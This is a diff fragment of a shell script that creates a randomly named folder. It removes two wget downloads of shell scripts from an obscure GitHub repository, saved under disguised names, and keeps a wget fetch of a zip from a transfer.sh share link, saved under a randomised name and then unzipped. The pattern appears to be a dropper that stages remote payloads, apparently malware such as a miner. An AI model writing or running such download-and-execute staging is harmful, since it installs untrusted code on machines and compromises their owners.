@@ -10,13 +10,6 @@ fol=$(openssl rand -base64 6)
 ra3=$(openssl rand -hex 5)
 mkdir $fol
 cd $fol
-
-
-ran1=$(openssl rand -hex 4)
-ran2=$(openssl rand -hex 6)
-wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O dan1.sh 
-wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O dan2.sh
-
 z3=$(openssl rand -hex 3)
 wget http://transfer.sh/H8t4Pk/mav.zip -O ty$z3.zip
 unzip ty$z3.zip 
